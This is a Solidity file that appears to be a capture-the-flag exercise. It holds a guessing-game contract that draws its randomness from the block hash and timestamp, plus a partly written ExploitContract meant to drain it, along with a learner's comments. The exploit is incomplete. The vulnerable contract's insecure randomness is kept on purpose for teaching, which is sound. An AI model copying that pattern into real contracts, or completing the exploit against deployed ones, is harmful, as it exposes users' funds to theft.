// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PredictTheFuture {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    //I have to first lock in my guess
    // I choose n, so let's say n is 5
    //guess becomes 5
    //settlementBlockNumber would be the same block number if I store it correctly in myBlockNumber, +1

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    //It seems that I do not know the block number
    function settle() public {
        //can we make ourselves address 0?
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);
        //max int8 is 255
        // after modulo 10
        // answer must be within in the range of 0-9
        //
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Failed to send to msg.sender");
        }
    }
}

contract ExploitContract {
    PredictTheFuture public predictTheFuture;

    constructor(PredictTheFuture _predictTheFuture) {
        predictTheFuture = _predictTheFuture;
    }

    function lockInMyGuess(uint8 guess) public payable {
        //modulo 10, so for safety, require that its 0-9
        require(guess < 10, "Must be 0-9");
        predictTheFuture.lockInGuess{value: 1 ether}(guess);
    }

    // Write your exploit code below

    function Exploit() public {
        predictTheFuture.settle();
        require(predictTheFuture.isComplete(), "Not Complete");
    }
    /**
     * @dev Must implement receive
     */

    receive() external payable {}
}
